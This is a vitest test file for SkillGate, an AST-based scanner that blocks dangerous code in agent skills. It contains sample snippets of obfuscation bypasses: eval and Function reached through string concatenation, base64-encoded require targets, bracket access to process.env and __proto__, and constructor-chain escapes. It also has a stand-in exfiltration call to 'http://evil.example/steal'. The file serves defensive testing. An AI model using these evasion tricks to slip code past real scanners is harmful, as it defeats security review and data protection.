/**
 * Obfuscation coverage for the local-only tier of SkillGate.
 *
 * The previous regex-based implementation had 9 well-known trivial bypasses.
 * The AST-based implementation in ast-checker.ts is supposed to close them;
 * this file locks that down so regressions are caught immediately.
 *
 * Each bypass that used to defeat regex detection is now asserted to be
 * CAUGHT (decision.allowed === false, CRITICAL:no-injection-patterns fails).
 * We also assert a few baselines (obvious attacks still caught; legitimate
 * code still passes) and a couple of false-positive regressions (patterns
 * inside comments and string literals must NOT trigger).
 */
import { describe, it, expect } from 'vitest';
import type { SkillManifest } from '@odin/core';
import { SkillGate } from '../skill-gate.js';
import { AgentLayersClient } from '../agentlayers-client.js';

function makeGate(): SkillGate {
  // No API key → scanSkill() returns null, keeping us in local-only mode.
  const client = new AgentLayersClient({ baseUrl: 'https://unused.example' });
  return new SkillGate(client);
}

function makeManifest(overrides: Partial<SkillManifest> = {}): SkillManifest {
  return {
    name: 'test-skill',
    version: '1.0.0',
    description: 'Test skill for obfuscation detection',
    author: 'test',
    tools: [],
    trustTier: 0,
    ...overrides,
  };
}

/** Convenience: assert the skill was blocked for injection specifically. */
function expectBlockedForInjection(decision: Awaited<ReturnType<SkillGate['verify']>>): void {
  expect(decision.allowed).toBe(false);
  const injectionCheck = decision.localChecks.find(
    c => c.check === 'CRITICAL:no-injection-patterns',
  );
  expect(injectionCheck, 'expected CRITICAL:no-injection-patterns check to exist').toBeDefined();
  expect(injectionCheck!.passed, injectionCheck!.details).toBe(false);
}

function expectAllowed(decision: Awaited<ReturnType<SkillGate['verify']>>): void {
  const injectionCheck = decision.localChecks.find(
    c => c.check === 'CRITICAL:no-injection-patterns',
  );
  expect(injectionCheck, 'expected CRITICAL:no-injection-patterns check to exist').toBeDefined();
  expect(injectionCheck!.passed, injectionCheck!.details).toBe(true);
}

describe('SkillGate — baseline injection detection (AST)', () => {
  it('catches direct eval() calls', async () => {
    const src = `eval("alert(1)");`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('catches require("child_process")', async () => {
    const src = `const cp = require("child_process"); cp.exec("ls");`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('catches import from "fs"', async () => {
    const src = `import { readFileSync } from "fs";`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('catches process.env access', async () => {
    const src = `const key = process.env.API_KEY;`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('catches __proto__ access via dot notation', async () => {
    const src = `obj.__proto__.polluted = 1;`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('allows legitimate code with no dangerous patterns', async () => {
    const src = `
      export function greet(name) {
        return \`hello, \${name}\`;
      }
    `;
    const decision = await makeGate().verify(makeManifest(), src);
    expectAllowed(decision);
  });

  it('allows fetch() over HTTPS', async () => {
    const src = `fetch("https://api.example.com/data");`;
    const decision = await makeGate().verify(
      makeManifest({
        tools: [
          {
            name: 'f',
            description: 'f',
            parameters: {},
            ring: 1,
            requiredPermissions: ['network'],
          },
        ],
      }),
      src,
    );
    expectAllowed(decision);
  });
});

describe('SkillGate — obfuscation bypasses that used to defeat regex', () => {
  it('bypass #1: catches eval reached via bracket + string concat (globalThis["ev"+"al"])', async () => {
    // The literal identifier "eval" never appears in the source, so the old
    // /eval\s*\(/ regex never fires. Constant folding resolves the bracket
    // property to "eval" and we flag dangerous-identifier-bracket.
    const src = `globalThis["ev" + "al"]("alert(1)");`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #1b: catches Function reached via bracket + string concat', async () => {
    const src = `const F = globalThis["Func" + "tion"]; new F("return 1")();`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #2: catches Function() constructor (never named "eval")', async () => {
    const src = `const f = new Function("return process"); f();`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #2b: catches Function() called without new', async () => {
    const src = `const f = Function("return 1"); f();`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #3: catches base64-encoded module names — require(atob("..."))', async () => {
    const src = `const fs = require(atob("ZnM="));`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #3b: catches require() with any non-literal argument', async () => {
    const src = `
      const name = getModule();
      const m = require(name);
    `;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #4: catches dynamic import() with computed argument', async () => {
    const src = `const m = await import(Buffer.from("ZnM=", "base64").toString());`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #4b: catches dynamic import() of a dangerous module via literal', async () => {
    const src = `const cp = await import("child_process");`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #5: catches process["env"] bracket notation', async () => {
    const src = `const key = process["env"].API_KEY;`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #5b: catches process["en" + "v"] concat bracket', async () => {
    const src = `const key = process["en" + "v"].API_KEY;`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #6: catches fetch() with string-concatenated http: URL', async () => {
    const src = `fetch("ht" + "tp://evil.example/steal");`;
    const decision = await makeGate().verify(
      makeManifest({
        tools: [
          {
            name: 'f',
            description: 'f',
            parameters: {},
            ring: 1,
            requiredPermissions: ['network'],
          },
        ],
      }),
      src,
    );
    expectBlockedForInjection(decision);
  });

  it('bypass #7: catches obj["__" + "proto__"] computed property bypass', async () => {
    const src = `obj["__" + "proto__"].polluted = 1;`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #8: catches constructor access via bracket notation', async () => {
    const src = `({})["constructor"]["constructor"]("return process")();`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });

  it('bypass #9: catches node:child_process prefix form', async () => {
    const src = `import { exec } from "node:child_process";`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
  });
});

describe('SkillGate — false-positive regressions (comments & strings)', () => {
  it('does NOT flag "eval" appearing only in a comment', async () => {
    const src = `
      // TODO: we used to use eval() here but it was too risky.
      export const safe = 1;
    `;
    const decision = await makeGate().verify(makeManifest(), src);
    expectAllowed(decision);
  });

  it('does NOT flag process.env appearing only in a string literal', async () => {
    const src = `
      export const docstring = "Do not read process.env in plugins.";
    `;
    const decision = await makeGate().verify(makeManifest(), src);
    expectAllowed(decision);
  });

  it('does NOT flag a block comment that mentions __proto__', async () => {
    const src = `
      /* Warning: never touch __proto__. */
      export const value = 42;
    `;
    const decision = await makeGate().verify(makeManifest(), src);
    expectAllowed(decision);
  });

  it('does NOT flag the identifier "evaluate" containing "eval"', async () => {
    const src = `
      export function evaluate(x) { return x * 2; }
      evaluate(21);
    `;
    const decision = await makeGate().verify(makeManifest(), src);
    expectAllowed(decision);
  });
});

describe('SkillGate — regex fallback when AST parsing fails', () => {
  it('still catches obvious eval when source is not parseable JS', async () => {
    // Classic TS-only syntax that acorn cannot parse — forces the fallback path.
    const src = `type X = { v: number }; eval("bad");`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectBlockedForInjection(decision);
    const injectionCheck = decision.localChecks.find(
      c => c.check === 'CRITICAL:no-injection-patterns',
    );
    expect(injectionCheck!.details).toMatch(/regex fallback/);
  });

  it('passes legitimate TS-like syntax through the fallback without false flags', async () => {
    // Unparseable, but nothing dangerous — fallback regex should let it through.
    const src = `type X = { v: number }; const y: X = { v: 1 };`;
    const decision = await makeGate().verify(makeManifest(), src);
    expectAllowed(decision);
  });
});
